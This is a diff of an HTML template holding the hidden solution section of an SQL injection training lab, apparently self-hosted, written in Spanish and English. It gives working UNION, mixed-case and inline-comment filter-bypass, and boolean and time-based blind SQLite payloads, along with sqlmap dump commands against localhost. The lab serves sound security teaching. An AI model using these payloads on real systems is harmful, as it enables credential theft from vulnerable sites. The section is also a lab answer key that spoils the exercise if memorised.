@@ -41,50 +41,72 @@
 
 <div id="resolution-data" class="hidden">
   <div class="lang-content" data-lang="es">
-    <h3>Pasos de explotación</h3>
+    <h3>Easy — Error-based (sin WAF)</h3>
     <ol>
-      <li><strong>Easy:</strong> Prueba el payload básico para obtener todos los registros:
+      <li>Verifica la inyección — devuelve todos los productos:
         <pre>' OR '1'='1</pre></li>
-      <li>Extrae la tabla de usuarios con UNION (Easy):
-        <pre>' UNION SELECT 1,username,password_plain,4,5 FROM users--</pre></li>
-      <li>Extrae hashes (Easy): <code>' UNION SELECT 1,username,password_md5,4,5 FROM users--</code></li>
-      <li><strong>Medium:</strong> Bloquea <code>union, select, drop, insert, update, delete, --</code> en minúsculas. El filtro usa <code>.lower()</code> así que las mayúsculas tampoco funcionan. Usa sqlmap con tamper scripts:
-        <pre>sqlmap -u "http://TARGET_IP/sqli/search?q=Kali" --dbms=SQLite --dbs --batch --tamper=between</pre></li>
-      <li><strong>Hard:</strong> WAF con regex <code>\bunion\b</code>, <code>\bselect\b</code>, <code>[';]</code>, <code>--</code>. La inyección directa está bloqueada. Usa sqlmap con tamper scripts para intentar bypasses avanzados:
-        <pre>sqlmap -u "http://TARGET_IP/sqli/search?q=Kali" --dbms=SQLite --dbs --batch \
-  --tamper=between,randomcase,space2comment --level=5 --risk=3</pre></li>
-      <li>Automatización completa con sqlmap (Easy):
-        <pre># Usa un valor que coincida con un producto (Kali, Burp, Flipper, etc.)
-sqlmap -u "http://TARGET_IP/sqli/search?q=Kali" --dbms=SQLite --dbs --batch
-sqlmap -u "http://TARGET_IP/sqli/search?q=Kali" --dbms=SQLite -D main --tables --batch
-sqlmap -u "http://TARGET_IP/sqli/search?q=Kali" --dbms=SQLite -D main -T users --dump --batch</pre></li>
-      <li>Con Burp Suite: intercepta el GET, envía al Repeater y modifica el parámetro <code>q</code>.</li>
+      <li>Extrae la estructura de la base de datos:
+        <pre>' UNION SELECT null,name,sql FROM sqlite_master--</pre></li>
+      <li>Extrae datos sensibles de la tabla users:
+        <pre>' UNION SELECT null,username,password FROM users--</pre></li>
+      <li>O automatiza con sqlmap:
+        <pre>sqlmap -u "http://localhost:5000/sqli/search?q=test" --dump</pre></li>
+    </ol>
+    <h3>Medium — Bypass de blacklist</h3>
+    <ol>
+      <li>El WAF bloquea palabras clave en minúsculas. Bypassea con mayúsculas mixtas:
+        <pre>' UnIoN SeLeCt null,username,password FROM users--</pre></li>
+      <li>O usa comentarios inline para romper las palabras clave:
+        <pre>' /*!UNION*/ /*!SELECT*/ null,username,password FROM users--</pre></li>
+      <li>O usa sqlmap con tamper de randomcase:
+        <pre>sqlmap -u "http://localhost:5000/sqli/search?q=test" --tamper=randomcase --dump</pre></li>
+    </ol>
+    <h3>Hard — Blind (boolean-based + time-based)</h3>
+    <ol>
+      <li>No se muestran errores. Usa boolean-based blind para extraer carácter a carácter:
+        <pre>' AND (SELECT SUBSTR(password,1,1) FROM users WHERE username='admin')='a</pre>
+        Cambia el carácter hasta que la consulta devuelva resultados.</li>
+      <li>Time-based blind con SQLite (randomblob genera delay):
+        <pre>' AND (SELECT CASE WHEN (SUBSTR(password,1,1)='a') THEN randomblob(300000000) ELSE '' END) IS NOT ''--</pre></li>
+      <li>Automatiza con sqlmap especificando las técnicas blind:
+        <pre>sqlmap -u "http://localhost:5000/sqli/search?q=test" --technique=BT --level=3 --risk=2 --dump</pre></li>
     </ol>
     <h3>Herramientas</h3>
-    <div><span class="tools-badge">sqlmap</span> <span class="tools-badge">Burp Suite</span> <span class="tools-badge">manual</span></div>
+    <div><span class="tools-badge">sqlmap</span> <span class="tools-badge">Burp Suite</span> <span class="tools-badge">curl</span></div>
   </div>
   <div class="lang-content" data-lang="en" style="display:none">
-    <h3>Exploitation Steps</h3>
+    <h3>Easy — Error-based (no WAF)</h3>
     <ol>
-      <li><strong>Easy:</strong> Try the basic payload to retrieve all records:
+      <li>Verify injection — returns all products:
         <pre>' OR '1'='1</pre></li>
-      <li>Dump the users table with UNION (Easy):
-        <pre>' UNION SELECT 1,username,password_plain,4,5 FROM users--</pre></li>
-      <li>Extract hashes (Easy): <code>' UNION SELECT 1,username,password_md5,4,5 FROM users--</code></li>
-      <li><strong>Medium:</strong> Blocks <code>union, select, drop, insert, update, delete, --</code> (lowercase check). The filter uses <code>.lower()</code> so case variations don't work either. Use sqlmap with tamper scripts:
-        <pre>sqlmap -u "http://TARGET_IP/sqli/search?q=Kali" --dbms=SQLite --dbs --batch --tamper=between</pre></li>
-      <li><strong>Hard:</strong> WAF with regex <code>\bunion\b</code>, <code>\bselect\b</code>, <code>[';]</code>, <code>--</code>. Direct injection is blocked. Use sqlmap with tamper scripts for advanced bypasses:
-        <pre>sqlmap -u "http://TARGET_IP/sqli/search?q=Kali" --dbms=SQLite --dbs --batch \
-  --tamper=between,randomcase,space2comment --level=5 --risk=3</pre></li>
-      <li>Full automation with sqlmap (Easy):
-        <pre># Use a value that matches a product (Kali, Burp, Flipper, etc.)
-sqlmap -u "http://TARGET_IP/sqli/search?q=Kali" --dbms=SQLite --dbs --batch
-sqlmap -u "http://TARGET_IP/sqli/search?q=Kali" --dbms=SQLite -D main --tables --batch
-sqlmap -u "http://TARGET_IP/sqli/search?q=Kali" --dbms=SQLite -D main -T users --dump --batch</pre></li>
-      <li>With Burp Suite: intercept the GET request, send to Repeater and modify the <code>q</code> parameter.</li>
+      <li>Extract the database structure:
+        <pre>' UNION SELECT null,name,sql FROM sqlite_master--</pre></li>
+      <li>Extract sensitive data from the users table:
+        <pre>' UNION SELECT null,username,password FROM users--</pre></li>
+      <li>Or automate with sqlmap:
+        <pre>sqlmap -u "http://localhost:5000/sqli/search?q=test" --dump</pre></li>
+    </ol>
+    <h3>Medium — Blacklist bypass</h3>
+    <ol>
+      <li>The WAF blocks lowercase keywords. Bypass with mixed case:
+        <pre>' UnIoN SeLeCt null,username,password FROM users--</pre></li>
+      <li>Or use inline comments to break keywords:
+        <pre>' /*!UNION*/ /*!SELECT*/ null,username,password FROM users--</pre></li>
+      <li>Or use sqlmap with the randomcase tamper:
+        <pre>sqlmap -u "http://localhost:5000/sqli/search?q=test" --tamper=randomcase --dump</pre></li>
+    </ol>
+    <h3>Hard — Blind (boolean-based + time-based)</h3>
+    <ol>
+      <li>No errors are shown. Use boolean-based blind to extract data character by character:
+        <pre>' AND (SELECT SUBSTR(password,1,1) FROM users WHERE username='admin')='a</pre>
+        Change the character until the query returns results.</li>
+      <li>Time-based blind with SQLite (randomblob generates delay):
+        <pre>' AND (SELECT CASE WHEN (SUBSTR(password,1,1)='a') THEN randomblob(300000000) ELSE '' END) IS NOT ''--</pre></li>
+      <li>Automate with sqlmap specifying blind techniques:
+        <pre>sqlmap -u "http://localhost:5000/sqli/search?q=test" --technique=BT --level=3 --risk=2 --dump</pre></li>
     </ol>
     <h3>Tools</h3>
-    <div><span class="tools-badge">sqlmap</span> <span class="tools-badge">Burp Suite</span> <span class="tools-badge">manual</span></div>
+    <div><span class="tools-badge">sqlmap</span> <span class="tools-badge">Burp Suite</span> <span class="tools-badge">curl</span></div>
   </div>
 </div>
 {% endblock %}
